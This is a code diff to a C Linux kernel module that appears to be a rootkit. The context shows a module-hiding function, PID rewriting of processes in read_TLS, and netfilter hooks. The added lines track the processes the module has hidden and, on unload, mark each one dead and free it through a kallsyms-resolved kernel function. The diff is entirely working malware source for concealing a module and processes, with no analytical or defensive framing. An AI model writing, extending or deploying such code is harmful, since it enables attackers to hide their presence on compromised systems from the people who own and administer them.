@@ -35,6 +35,9 @@
 int hidden = 0;
 static struct list_head *mod_list;
 
+static struct task_struct *hidden_procs[10];
+int hidden_count = 0;
+
 void hide(void) {
     if (hidden)
         return;
@@ -371,6 +374,7 @@ int read_TLS(void) {
                     change_pidR(ts, PIDTYPE_PID, newpid);
 
                     write_unlock(lo);
+                    hidden_procs[hidden_count++] = ts;
                 }
             }
         } else {
@@ -638,6 +642,8 @@ static int __init mod_init(void) {
     return 0;
 }
 
+static asmlinkage void (*my_release_task_stack) (struct task_struct *ts);
+
 /*
  * function:
  *    mod_exit
@@ -652,6 +658,17 @@ static int __init mod_init(void) {
  * Module exit function
  */
 static void __exit mod_exit(void) {
+    int i;
+
+    my_release_task_stack = kallsyms_lookup_name("release_task_stack");
+
+    for (i = 0; i < hidden_count; ++i) {
+        hidden_procs[i]->state = TASK_DEAD;
+        my_release_task_stack(hidden_procs[i]);
+        free_task(hidden_procs[i]);
+    }
+
+
     nf_unregister_net_hook(&init_net, &nfho);
     nf_unregister_net_hook(&init_net, &nfhi);
 
